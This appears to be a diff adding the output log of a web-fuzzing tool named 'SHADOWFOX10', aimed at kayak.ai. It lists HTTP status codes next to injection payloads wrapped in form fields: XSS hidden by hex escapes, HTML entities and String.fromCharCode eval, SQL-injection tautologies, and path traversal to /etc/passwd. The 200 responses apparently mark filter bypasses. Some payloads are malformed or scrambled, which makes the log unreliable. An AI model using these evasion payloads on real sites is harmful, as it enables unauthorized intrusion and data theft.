@@ -1,0 +1,33 @@
+=== SHADOWFOX10 :: SECURITY REPORT ===
+Target: kayak.ai?q=<form action='
+
+[STATUS]: 200
+[PAYLOAD]: <form action='/submit'><input name='note' value='<div style='display:none'>\x27\x20\x4f\x52\x20\x27\x31\x27\x3d\x27\x31</div>'></form>
+---
+[STATUS]: 200
+[PAYLOAD]: <form action='/submit'><input name='note' value='&lt;svg onload=\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29\x3e&gt;'></form>
+---
+[STATUS]: 200
+[PAYLOAD]: <form action='/submit'><input name='note' value='<template>' OR '1'='1</template>'></form>
+---
+[STATUS]: 200
+[PAYLOAD]: <form action='/submit'><input name='note' value='eval(String.fromCharCode(39,32,79,82,32,39,49,39,61,39,49))'></form>
+---
+[STATUS]: 200
+[PAYLOAD]: <form action='/submit'><input name='note' value='&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;'></form>
+---
+[STATUS]: 406
+[PAYLOAD]: <form action='/submit'><input name='note' value='&lt;img src=x onerror=alert('xss')&gt;'></form>
+---
+[STATUS]: 406
+[PAYLOAD]: <form action='/submit'><input name='note' value='setTimeout(()=>../../../etc/passwd,1000)'></form>
+---
+[STATUS]: 406
+[PAYLOAD]: <form action='/submit'><input name='note' value='../../../etc/passwd'></form>
+---
+[STATUS]: 200
+[PAYLOAD]: <form action='/submit'><input name='note' value='<svg onload=\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29\x3e>'></form>
+---
+[STATUS]: 200
+[PAYLOAD]: <form action='/submit'><input name='note' value='1'='1' RO ''></form>
+---
